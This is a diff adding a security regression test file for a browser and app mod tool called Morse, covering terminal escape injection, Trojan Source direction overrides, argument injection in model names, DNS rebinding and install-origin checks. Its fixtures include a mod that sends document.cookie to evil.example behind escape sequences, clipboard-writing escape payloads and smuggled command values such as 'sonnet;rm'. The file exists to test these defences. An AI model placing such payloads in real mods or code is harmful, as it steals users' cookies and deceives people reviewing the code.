@@ -1,0 +1,405 @@
+// Bug and security hunt, round 8: model routing and `morse setup`, the
+// words and code people review (direction overrides, escape sequences), the
+// how-it-works recording script and the demo server; then the items that review
+// left open (the share page's address, the demo gallery list, joiners in pack
+// titles, a gallery mod that checked every box, a broken gallery link). Each
+// test failed before its fix.
+import { home } from "./helpers/home.js";
+import { test, after } from "node:test";
+import assert from "node:assert/strict";
+import http from "node:http";
+import path from "node:path";
+import vm from "node:vm";
+import { readFileSync, writeFileSync } from "node:fs";
+import { spawnSync } from "node:child_process";
+import { PassThrough } from "node:stream";
+import { noBrowser as skip, launchBrowser } from "./helpers/browser.js";
+import { bundleBoot, bundleUI } from "../runtime/bundle.js";
+
+import { parseImport, prepareInstall } from "../core/backup.js";
+import { validateMod } from "../core/mod.js";
+import { parseEntry } from "../core/gallery.js";
+import * as summary from "../core/summary.js";
+import { highlight } from "../site/common.js";
+
+void home;
+const cleanups = [];
+after(async () => { for (const f of cleanups.reverse()) await f().catch(() => {}); });
+const ROOT = path.resolve(path.dirname(new URL(import.meta.url).pathname), "..");
+const CLI = path.join(ROOT, "daemon", "cli.js");
+
+const mod = (id, extra = {}) => ({ morse: 1, id, title: `Mod ${id}`, prompt: `do ${id}`, css: `.${id} { color: red; }`, js: "", match: { hosts: ["news.example"], app: null }, enabled: true, created: "2026-01-01T00:00:00.000Z", updated: "2026-01-01T00:00:00.000Z", ...extra });
+// Characters that make text read (or a terminal behave) differently from what it is.
+const HIDDEN = /[\x00-\x09\x0b-\x1f\x7f-\x9f\u061c\u200b-\u200f\u2028\u2029\u202a-\u202e\u2066-\u2069\ufeff]/;
+const RLO = "\u202e", RLI = "\u2067", PDI = "\u2069";
+
+// ======================================================================
+// The terminal: what `morse` prints from mods and windows
+// ======================================================================
+
+test("morse mods, morse code, morse install and morse status print a mod's words, its code and a window's title as text, never escape sequences", async () => {
+  const { saveMod } = await import("../daemon/store.js");
+  const evil = mod("r8-term", {
+    title: "Tidy\x1b]52;c;ZWNobyBoaQ==\x07\x1b[2K",
+    prompt: "tidy up\x1b[1A\x1b[2K\r up\u009b2J",
+    css: "h1 { color: red }\n/* \x1b[8m */",
+    // Concealed text and a line rewritten from the start: the code you read isn't the code that runs.
+    js: "morse.toast('hi');\nfetch('https://evil.example/?d=' + document.cookie) // \x1b[1A\x1b[2K\rmorse.toast('bye');\n",
+  });
+  await saveMod(evil);
+  const env = { ...process.env, MORSE_HOME: home, NO_COLOR: "1" };
+  const run = (...args) => spawnSync(process.execPath, [CLI, ...args], { env, encoding: "utf8", timeout: 30000 });
+
+  const list = run("mods");
+  assert.equal(list.status, 0, list.stderr);
+  assert.match(list.stdout, /Tidy/);
+  assert.doesNotMatch(list.stdout, HIDDEN, `morse mods: ${JSON.stringify(list.stdout)}`);
+
+  const code = run("code", "r8-term");
+  assert.equal(code.status, 0, code.stderr);
+  assert.doesNotMatch(code.stdout, HIDDEN, `morse code: ${JSON.stringify(code.stdout)}`);
+  // The escape characters are written out, and the lone \r (a line break in JS too) is one.
+  assert.match(code.stdout, /document\.cookie\) \/\/ \\u001B\[1A\\u001B\[2K\nmorse\.toast\('bye'\);/, "the reader sees the line the escapes hid");
+
+  const file = path.join(home, "r8-install.morse.json");
+  writeFileSync(file, JSON.stringify(mod("r8-inst", { title: "Calm\x1b]0;owned\x07\x1b[2K" })));
+  const inst = run("install", file, "--yes");
+  assert.equal(inst.status, 0, inst.stderr);
+  assert.match(inst.stdout, /Installed:? Calm/);
+  assert.doesNotMatch(inst.stdout, HIDDEN, `morse install: ${JSON.stringify(inst.stdout)}`);
+
+  // `morse status`: window titles come from the app's pages.
+  const { formatStatus } = await import("../daemon/status.js");
+  const out = formatStatus([{ id: "app", name: "App", state: "attached", port: 9333, windows: [
+    { type: "page", url: "app://main/index.html", title: "Inbox\x1b]52;c;ZWNobyBoaQ==\x07\x1b[2K\r(3)", mods: [`Dark${RLO} mode\x1b[8m`] },
+  ] }]).replace(/\x1b\[(?:0|1|2|31|32|33|97)m/g, ""); // Morse's own colors, if on
+  assert.match(out, /Inbox/);
+  assert.doesNotMatch(out, HIDDEN, `morse status: ${JSON.stringify(out)}`);
+});
+
+// ======================================================================
+// The install review: direction overrides and invisible characters
+// ======================================================================
+
+test("a shared mod's sites can't carry direction overrides or invisible characters (shown reversed, they name another site)", async () => {
+  // Shown as "For: moc.knab.www" while it runs on www.bank.com, or the other way round.
+  for (const hosts of [[RLO, "www.bank.com"], [`${RLO}moc.swen`], ["news.example\u200b"], [`${RLI}news.example${PDI}`]]) {
+    assert.throws(() => validateMod(mod("r8-host", { match: { hosts, app: null } })), /where it runs/, JSON.stringify(hosts));
+    await assert.rejects(parseImport(JSON.stringify(mod("r8-host", { match: { hosts, app: null } }))), JSON.stringify(hosts));
+  }
+  assert.throws(() => validateMod(mod("r8-app", { match: { hosts: ["app"], app: `slack${RLO}` } })), /where it runs/);
+  // Ordinary sites still are.
+  assert.ok(validateMod(mod("r8-ok", { match: { hosts: ["news.example", "*.wiki.example", "127.0.0.1:8795", "file"], app: null } })));
+});
+
+test("a shared mod's title, request, author and model can't reverse the review line they're in (a hidden “Not this page”)", async () => {
+  const words = {
+    title: `Dark mode${RLO}`,
+    prompt: `make it dark ${RLI}please`,
+    author: `Morse team${RLO}`,
+    model: `haiku\u200f${RLO}`,
+  };
+  const { mods } = await parseImport(JSON.stringify(mod("r8-words", words)));
+  for (const k of Object.keys(words)) assert.doesNotMatch(mods[0][k], HIDDEN, `${k}: ${JSON.stringify(mods[0][k])}`);
+  assert.equal(mods[0].title, "Dark mode");
+  assert.equal(mods[0].author, "Morse team");
+  // What is saved is the same, whatever handed it to the host.
+  const saved = prepareInstall(mod("r8-words", words), { kind: "link" });
+  for (const k of Object.keys(words)) assert.doesNotMatch(saved[k], HIDDEN, `saved ${k}: ${JSON.stringify(saved[k])}`);
+  // The gallery's list: its titles, notes and tags are shown the same way.
+  const e = parseEntry({ file: "x.morse.json", title: `Dark${RLO} mode`, prompt: `dark${RLI} please`, author: `Team${RLO}`, changes: `fix${RLO}`, tags: [`dark${RLO}`], match: { hosts: ["news.example"] } });
+  for (const v of [e.title, e.prompt, e.author, e.changes, ...e.tags]) assert.doesNotMatch(v, HIDDEN, JSON.stringify(v));
+});
+
+test("code shown for review (the share page, the gallery page, the install review) shows direction overrides instead of obeying them", () => {
+  // "Trojan Source": the comment's override makes the line read as a harmless one.
+  const { shownCode } = summary;
+  const js = `const ok = true; /* ${RLO} } ;)(eikooc.tnemucod(hctef { */\nmorse.toast("hi");`;
+  assert.doesNotMatch(shownCode(js), HIDDEN);
+  assert.match(shownCode(js), /\/\* \\u202E \}/);
+  assert.equal(shownCode("a\n\tb"), "a\n\tb", "line breaks and tabs stay");
+  const html = highlight(js, "js");
+  assert.doesNotMatch(html, HIDDEN, html);
+  assert.match(html, /\\u202E/);
+});
+
+// The boot and the UI on a page, with a stand-in host (as in round 7) that
+// answers mods.preview with `preview` and can hand the runtime an install request.
+async function reviewPage(preview) {
+  const UI = bundleUI(), BOOT = bundleBoot();
+  const s = http.createServer((q, r) => {
+    if (q.url === "/ui.js") return r.writeHead(200, { "Content-Type": "text/javascript" }).end(UI);
+    r.writeHead(200, { "Content-Type": "text/html" }).end("<!doctype html><title>News</title><body><h1>News</h1></body>");
+  }).listen(0, "127.0.0.1");
+  await new Promise(r => s.on("listening", r));
+  cleanups.push(() => new Promise(r => { s.close(r); s.closeAllConnections(); }));
+  const browser = await launchBrowser();
+  cleanups.push(() => browser.close());
+  const ctx = await browser.newContext({ viewport: { width: 1000, height: 800 } });
+  await ctx.addInitScript(preview => {
+    if (window !== top) return;
+    localStorage.setItem("morse:debug", "1"); // an open shadow root (webdriver is on)
+    const subs = [];
+    const emit = m => subs.forEach(f => f(m));
+    window.__emit = emit;
+    globalThis.__morseHost = {
+      onMessage: f => subs.push(f),
+      send(m) {
+        const reply = result => setTimeout(() => emit({ reply: m.id, result }), 2);
+        switch (m.type) {
+          case "hello": return reply({ mode: "extension", label: "test", quiet: true, settings: { welcome: false } });
+          case "settings.get": return reply({ welcome: false });
+          case "mods.list": return reply([]);
+          case "mods.preview": return reply(preview);
+          case "ui.load": {
+            const el = document.createElement("script");
+            el.src = "/ui.js";
+            el.onload = () => reply(true);
+            document.head.append(el);
+            return;
+          }
+          default: return reply(null);
+        }
+      },
+    };
+  }, preview);
+  const page = await ctx.newPage();
+  await page.goto(`http://127.0.0.1:${s.address().port}/`);
+  await page.addScriptTag({ content: BOOT });
+  await page.waitForFunction(() => document.querySelector("[data-morse-ui]")?.shadowRoot);
+  await page.waitForFunction(() => JSON.parse(document.querySelector("[data-morse-ui]").dataset.status || "{}").ready);
+  return page;
+}
+
+test("the install review's Show code shows a direction override as \\u202E, not reversed code", { skip, timeout: 60000 }, async () => {
+  const js = `morse.toast("hi"); /* ${RLO} } ;)(eikooc.tnemucod(hctef { */`;
+  const page = await reviewPage({ kind: "link", mods: [mod("r8-trojan", { js, title: "Hi" })], errors: [] });
+  await page.evaluate(() => window.__emit({ type: "install.request", source: "{}" }));
+  await page.waitForFunction(() => document.querySelector("[data-morse-ui]").shadowRoot.querySelector(".ctl-code pre"));
+  const shown = await page.evaluate(() => [...document.querySelector("[data-morse-ui]").shadowRoot.querySelectorAll(".ctl-code pre")].map(p => p.textContent).join("\n"));
+  assert.doesNotMatch(shown, HIDDEN, JSON.stringify(shown));
+  assert.match(shown, /\\u202E/);
+});
+
+// ======================================================================
+// Models: morse setup
+// ======================================================================
+
+test("morse setup --fast-model / --best-model refuses a name Morse can't hand to claude or codex, like morse config does", async () => {
+  const { runSetup } = await import("../daemon/setup.js");
+  const machine = { env: {}, which: async n => (n === "claude" ? "/usr/local/bin/claude" : ""), version: async () => "2.1.3" };
+  for (const [flag, name] of [["--fast-model", "-p --dangerously-skip-permissions"], ["--best-model", "sonnet;rm"], ["--fast-model", "-c"]]) {
+    const input = new PassThrough(), output = new PassThrough();
+    let text = "", saved = null;
+    output.on("data", d => (text += d));
+    input.end();
+    const res = await runSetup(["--use", "claude-code", flag, name], { input, output, deps: machine, load: async () => ({}), save: async c => { saved = c; }, savePrefs: async () => {}, platform: "linux" });
+    assert.equal(res.saved, false, `${flag} ${name}: ${text}`);
+    assert.equal(saved, null, `${flag} ${name} is not written to config.json`);
+    assert.match(text, /isn't a model name/);
+  }
+  // A real name is still saved.
+  const input = new PassThrough(), output = new PassThrough();
+  input.end();
+  let saved = null;
+  const res = await runSetup(["--use", "claude-code", "--fast-model", "claude-haiku-4-5"], { input, output, deps: machine, load: async () => ({}), save: async c => { saved = c; }, savePrefs: async () => {}, platform: "linux" });
+  assert.equal(res.saved, true);
+  assert.equal(saved.tiers["claude-code"].fast, "claude-haiku-4-5");
+});
+
+// ======================================================================
+// The how-it-works recording script and the demo server
+// ======================================================================
+
+test("demo/record-how-it-works.sh: its X display needs a key, is one nobody else is using, and the app keeps its sandbox", () => {
+  const sh = readFileSync(path.join(ROOT, "demo", "record-how-it-works.sh"), "utf8");
+  const code = sh.split("\n").filter(l => !/^\s*#/.test(l)).join("\n");
+  // Without -auth, any program on the computer can open the display: see the
+  // screen, and type into the app (VSCodium has a terminal).
+  assert.match(code, /\bXvfb\b[^\n]*-auth\s+"?\$/, "Xvfb starts with an authorization file");
+  assert.match(code, /xauth\b[^\n]*\badd\b/, "with a fresh key in it");
+  // A fixed display someone else already runs: Xvfb fails, and the script
+  // would record and type into that one.
+  assert.doesNotMatch(code, /^D=:\d+\s*$/m, "no fixed display number");
+  assert.match(code, /kill -0/, "it checks its own Xvfb is the one running");
+  // --no-sandbox only where Electron needs it (as root).
+  assert.doesNotMatch(code, /^\s*-- --no-sandbox/m, "VSCodium keeps its sandbox");
+  const r = spawnSync("bash", ["-n", path.join(ROOT, "demo", "record-how-it-works.sh")], { encoding: "utf8" });
+  assert.equal(r.status, 0, r.stderr);
+});
+
+test("demo/serve.js: another site (DNS rebinding) can't read the repo through it, .git stays out, and a bad address doesn't stop it", async () => {
+  const { serveDemo } = await import("../demo/serve.js");
+  const demo = await serveDemo({ base: 0 });
+  cleanups.push(() => demo.close());
+  const port = demo.sites.parley;
+  const get = (p, host = `127.0.0.1:${port}`) => new Promise((resolve, reject) => {
+    const q = http.request({ host: "127.0.0.1", port, path: p, headers: { Host: host } }, r => { r.resume(); r.on("end", () => resolve(r.statusCode)); });
+    q.on("error", reject);
+    q.end();
+  });
+  assert.equal(await get("/demo/sites/parley/"), 200);
+  assert.equal(await get("/demo/sites/parley/", `localhost:${port}`), 200);
+  assert.equal(await get("/demo/sites/parley/", "attacker.example"), 403, "a page whose name now points at 127.0.0.1");
+  assert.equal(await get("/package.json", "attacker.example:8787"), 403);
+  for (const p of ["/.git/HEAD", "/.git/config", "/.env", "/demo/sites/../.git/HEAD"]) assert.notEqual(await get(p), 200, p);
+  assert.equal(await get("/%E0%A4%A"), 400);
+  assert.equal(await get("/demo/sites/parley/"), 200, "still serving");
+});
+
+// ======================================================================
+// Left open by the round 8 review
+// ======================================================================
+
+// extension/host.js in a stand-in content script world, on the page at `url`.
+// -> { post(data), go(url), asked: [the install requests it passed on] }
+function shareHost(url) {
+  const listeners = [];
+  const window = { addEventListener: (type, f) => { if (type === "message") listeners.push(f); } };
+  window.top = window;
+  const location = {};
+  const go = u => { const x = new URL(u); Object.assign(location, { href: x.href, origin: x.origin, pathname: x.pathname }); };
+  go(url);
+  const chrome = { runtime: { connect: () => ({ postMessage() {}, onMessage: { addListener() {} }, onDisconnect: { addListener() {} } }), onMessage: { addListener() {} } } };
+  const ctx = vm.createContext({ chrome, window, location, document: { documentElement: { dataset: {} } } });
+  vm.runInContext(readFileSync(path.join(ROOT, "extension/host.js"), "utf8"), ctx);
+  const asked = [];
+  ctx.__morseHost.onMessage(m => { if (m.type === "install.request") asked.push(m.source); });
+  return { asked, go, post: data => listeners.forEach(f => f({ source: window, data })) };
+}
+
+test("only Morse's share page can ask for an install, not every page on the same GitHub Pages address", () => {
+  const asks = url => { const h = shareHost(url); h.post({ morseInstall: "#m=x" }); return h.asked.length === 1; };
+  assert.ok(asks("https://sam-siavoshian.github.io/RRAA/share/install.html#m=x"), "the share page");
+  assert.ok(asks("http://127.0.0.1:8787/share/install.html"), "its local copy (test builds)");
+  for (const other of [
+    "https://sam-siavoshian.github.io/",                      // the owner's own page
+    "https://sam-siavoshian.github.io/another-project/",      // any other Pages project
+    "https://sam-siavoshian.github.io/RRAA-fork/share/install.html",
+    "https://sam-siavoshian.github.io/RRAA/site/gallery.html", // Morse's site, but not the share page
+    "https://sam-siavoshian.github.io/RRAA/sharex/install.html",
+    "http://127.0.0.1:8787/demo/sites/hostile/",               // another page on the test address
+    "https://evil.example/RRAA/share/install.html",
+  ]) assert.equal(asks(other), false, other);
+  // A page that moves itself to the share page's address (history.pushState).
+  const h = shareHost("https://sam-siavoshian.github.io/another-project/");
+  h.go("https://sam-siavoshian.github.io/RRAA/share/install.html");
+  h.post({ morseInstall: "#m=x" });
+  assert.deepEqual(h.asked, [], "it has to have loaded there");
+});
+
+test("the demo sites' local gallery list (http, 127.0.0.1:8787) is only read where a host asks for it, never by default", async () => {
+  const { indexUrlFor, GALLERY_INDEX_URL, DEMO_INDEX_URL } = await import("../core/gallery.js");
+  const { createGallery } = await import("../core/gallery-host.js");
+  // Any local server on those ports (wrangler's is on 8787) gets no say in the gallery.
+  for (const page of ["http://127.0.0.1:8787/", "http://localhost:8789/app", "http://127.0.0.1:8797/x"]) {
+    assert.equal(indexUrlFor(page), GALLERY_INDEX_URL, page);
+    assert.equal(indexUrlFor(page, "", DEMO_INDEX_URL), DEMO_INDEX_URL, `${page}, from a checkout`);
+  }
+  const fetched = [];
+  const data = {};
+  const gallery = createGallery({
+    store: { get: async k => data[k], set: async (k, v) => { data[k] = v; } },
+    fetch: async url => { fetched.push(url); return new Response("[]", { status: 200 }); },
+  });
+  await gallery.list({ url: "http://127.0.0.1:8789/demo/sites/tunes/" });
+  assert.deepEqual(fetched, [GALLERY_INDEX_URL]);
+  // The extension asks for it in test builds only (tests/store.test.js builds both).
+  assert.match(readFileSync(path.join(ROOT, "extension/gallery-host.js"), "utf8"), /demoIndex: globalThis\.MORSE_STORE_BUILD \? "" : DEMO_INDEX_URL/);
+  assert.match(readFileSync(path.join(ROOT, "scripts/build.js"), "utf8"), /"globalThis\.MORSE_STORE_BUILD": String\(STORE\)/);
+});
+
+test("a pack's titles and names keep the joiners Persian words and emoji need, and still lose direction tricks", async () => {
+  const { cleanText, makePack, parsePack } = await import("../core/pack.js");
+  const persian = "می‌خواهم", family = "👩‍👩‍👧";
+  assert.equal(cleanText(`${persian} ${family}`, 80), `${persian} ${family}`);
+  // Direction marks, overrides and isolates, the Arabic letter mark and zero-width spaces still go.
+  for (const c of [RLO, RLI, PDI, "​", "‎", "‏", "؜", "⁦", "﻿", "\x1b"]) {
+    assert.equal(cleanText(`a${c}b`, 80), "a b", JSON.stringify(c));
+  }
+  const m = mod("r8-joiners", { title: `${persian} ${family}`, author: `${persian}${RLO}` });
+  const pack = makePack([m], { name: `${family} ${persian}`, author: persian });
+  assert.equal(pack.name, `${family} ${persian}`);
+  assert.equal(pack.author, persian);
+  assert.equal(pack.mods[0].title, `${persian} ${family}`);
+  assert.equal(pack.mods[0].author, persian, "the override still goes");
+  const back = parsePack(JSON.stringify(pack)).pack;
+  assert.equal(back.name, pack.name);
+  assert.equal(back.mods[0].title, pack.mods[0].title);
+});
+
+// A page shaped like pkg.go.dev/net/http (the gallery check's page): a long
+// documentation, the survey banner and the cookie notice, plus a second
+// cookie notice by another name (what the mod's code is for).
+const GO_PAGE = `<!doctype html><html><head><title>http package - net/http - Go Packages</title>
+<style>.Cookie-notice, .consent-bar { position: fixed; left: 0; right: 0; bottom: 0; padding: 8px; background: #fff; }</style></head>
+<body><section class="go-SurveyBanner" aria-label="2026 Go Developer Survey">Take the survey</section>
+<main class="Documentation">${"<div><div><p>Package http provides HTTP client and server implementations.</p></div></div>".repeat(1500)}
+<div class="notice">A cookie jar keeps cookies between requests.</div></main>
+<aside class="Cookie-notice js-cookieNotice"><p>go.dev uses cookies from Google to deliver and enhance the quality of its services and to analyze traffic. <a href="#">Learn more.</a></p><button>Okay</button></aside>
+<div class="consent-bar" id="bar2">We use cookies. <button>OK</button></div></body></html>`;
+
+test("gallery mod go-hide-banners hides both banners without checking every box on the page", { skip, timeout: 120000 }, async () => {
+  const { loadCases, prepare, applyMod, runCheck } = await import("../evals/gallery-check.js");
+  const { stubs } = await import("../evals/page-helpers.js");
+  const c = loadCases().find(c => c.id === "go-hide-banners");
+  const m = JSON.parse(readFileSync(path.join(ROOT, "site/mods/go-hide-banners.morse.json"), "utf8"));
+  const browser = await launchBrowser();
+  cleanups.push(() => browser.close());
+  const ctx = await browser.newContext({ viewport: { width: 1280, height: 800 } });
+  await ctx.route("https://pkg.go.dev/**", r => r.fulfill({ status: 200, contentType: "text/html", body: GO_PAGE }));
+  const page = await ctx.newPage();
+  const errors = [];
+  page.on("pageerror", e => errors.push(e.message));
+  await page.addInitScript(stubs);
+  // Counts the style lookups the mod makes.
+  await page.addInitScript(() => {
+    const real = window.getComputedStyle;
+    window.__styleReads = 0;
+    window.getComputedStyle = function (...a) { window.__styleReads++; return real.apply(this, a); };
+  });
+  await page.goto(c.url);
+  await page.locator(c.waitFor).waitFor({ state: "attached" });
+  const B = await prepare(page, c);
+  assert.notEqual(await runCheck(page, c, B), true, "the check fails without the mod");
+  await page.evaluate(() => { window.__styleReads = 0; });
+  assert.deepEqual(await applyMod(page, m), []);
+  assert.equal(await runCheck(page, c, B), true, "the check passes with it");
+  assert.equal(await page.evaluate(() => getComputedStyle(document.getElementById("bar2")).display), "none", "a cookie notice by another name too");
+  assert.equal(await page.evaluate(() => getComputedStyle(document.querySelector(".Documentation .notice")).display), "block", "text about cookies in the page stays");
+  const first = await page.evaluate(() => window.__styleReads);
+  // The page keeps adding to the documentation: new boxes, none of them a notice.
+  await page.evaluate(async () => {
+    for (let i = 0; i < 5; i++) {
+      const more = document.createElement("div");
+      more.innerHTML = "<div><p>More documentation.</p></div>".repeat(400);
+      document.querySelector(".Documentation").append(more);
+      await new Promise(r => setTimeout(r, 300));
+    }
+    await new Promise(r => setTimeout(r, 1500)); // the kit's once-a-second look over the page
+  });
+  const total = await page.evaluate(() => window.__styleReads);
+  assert.ok(first <= 10, `${first} style lookups for a page of ${await page.evaluate(() => document.querySelectorAll("div").length)} boxes`);
+  assert.ok(total <= 20, `${total} style lookups after the page added 2000 more boxes`);
+  assert.deepEqual(errors, []);
+});
+
+test("the gallery page treats a broken link (#%E0) as no link, without an error", { skip, timeout: 60000 }, async () => {
+  const { serveDemo } = await import("../demo/serve.js");
+  const demo = await serveDemo({ base: 0 });
+  cleanups.push(() => demo.close());
+  const browser = await launchBrowser();
+  cleanups.push(() => browser.close());
+  const page = await browser.newPage();
+  const errors = [];
+  page.on("pageerror", e => errors.push(e.message));
+  await page.goto(`${demo.origin("parley")}/site/gallery.html#%E0`);
+  await page.waitForFunction(() => document.querySelectorAll("#grid > *").length > 5);
+  await page.waitForTimeout(300);
+  assert.deepEqual(errors, []);
+  assert.equal(await page.locator("#drawer").isHidden(), true, "no mod is open");
+  // A good link still opens its mod.
+  await page.evaluate(() => { location.hash = "#go-hide-banners"; });
+  await page.locator("#drawer").waitFor({ state: "visible" });
+  assert.deepEqual(errors, []);
+});
